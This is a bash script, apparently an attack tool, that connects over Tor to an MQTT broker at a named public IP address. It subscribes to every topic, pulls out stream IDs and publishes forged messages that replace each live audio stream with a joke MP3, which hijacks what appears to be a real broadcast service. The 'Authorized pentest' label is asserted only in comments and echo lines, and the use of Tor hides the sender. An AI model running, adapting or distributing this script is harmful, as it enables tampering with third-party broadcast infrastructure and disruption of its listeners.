#!/bin/bash
# AUTO_VOV_HIJACK_PEPPE.sh - Auto-discover + Hijack (Authorized pentest)

PEPPE_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"

hijack_stream() {
  local id=$1
  local topic="${id}:s:16"
  
  payload='{"n":"'"$id"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
  
  if torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -m "$payload" >/dev/null 2>&1; then
    echo "✅ HIJACK ${id:0:8}... FM (${topic})"
  fi
}

echo "🎵 AUTO Peppe.mp3 HIJACK VOV (Authorized pentest)"
echo "📡 42.1.64.56:1883 - Scanning live streams..."

torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null | \
while read -r line; do
  # Cerca ID stream :s:16
  if [[ $line =~ \"n\":\"([0-9]{17}):s:16\" ]]; then
    id="${BASH_REMATCH[1]}"
    hijack_stream "$id"
  fi
done
